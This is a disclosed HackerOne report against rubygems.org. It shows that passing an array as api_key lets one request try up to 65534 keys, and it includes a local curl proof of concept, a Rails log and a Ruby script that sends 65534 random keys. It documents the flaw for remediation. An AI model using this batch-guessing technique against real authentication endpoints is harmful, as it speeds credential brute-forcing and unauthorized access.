# 65534 times efficient, Brute-force attack for api_key

## Report Details
- **Report ID**: 449356
- **URL**: https://hackerone.com/reports/449356
- **State**: Closed
- **Severity**: low
- **Submitted**: 2018-11-24T14:40:39.546Z
- **Disclosed**: 2018-12-08T19:38:26.977Z

## Reporter
- **Username**: ooooooo_q
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: rubygems

## Vulnerability Information
I have found that type checking for `api_key` is insufficient in rubygems.org's source code.

https://github.com/rubygems/rubygems.org/blob/master/app/controllers/application_controller.rb#L63

```ruby
def authenticate_with_api_key
  api_key   = request.headers["Authorization"] || params[:api_key]
  @api_user = User.find_by_api_key(api_key)
end
```
Using an array in `params[:api_key]` makes searching for api_key more efficient.


### poc

1. start server in local
2. Access url with multiple api_key

```
$ curl --globoff 'http://localhost:3000/api/v1/gems?api_key[]=key1&api_key[]=key2'
> Access Denied. Please sign up for an account at https://rubygems.org
```

##### rails log

```log
Started GET "/api/v1/gems?api_key[]=key1&api_key[]=key2" for ::1 at 2018-11-24 23:03:30 +0900
Processing by Api::V1::RubygemsController#index as */*
  Parameters: {"api_key"=>["key1", "key2"]}
  User Load (0.5ms)  SELECT  "users".* FROM "users" WHERE "users"."api_key" IN ($1, $2) LIMIT $3  [["api_key", "key1"], ["api_key", "key2"], ["LIMIT", 1]]
  ↳ app/controllers/application_controller.rb:65
  Rendering text template
  Rendered text template (0.0ms)
Filter chain halted as :verify_authenticated_user rendered or redirected
Completed 401 Unauthorized in 2ms (Views: 0.3ms | ActiveRecord: 0.5ms | Elasticsearch: 0.0ms)
```

## Impact

As a result of trying how much it can be sent using POST, 65534 api_key's could be sent.
A postgres error will occur if you send more values.

Here is the script used for confirmation.

```ruby
require 'net/http'
require 'securerandom'
require 'json'

keys = 65534.times.map{SecureRandom.hex(32)}
# keys = 65535.times.map{SecureRandom.hex(32)} # error

uri = URI.parse("http://localhost:3000/api/v1/web_hooks/fire.json?url=http://example.com/")
http = Net::HTTP.new(uri.host, uri.port)
req = Net::HTTP::Post.new(uri.path)
req["Content-Type"] = "application/json"
req.body = {api_key: keys}.to_json

res = http.request(req)
```

Attacks against api_key are 65534 times more efficient, but since the string generated by `SecureRandom.hex (32)` has sufficient length, the impact seems to be minimal.

## Attachments
No attachments
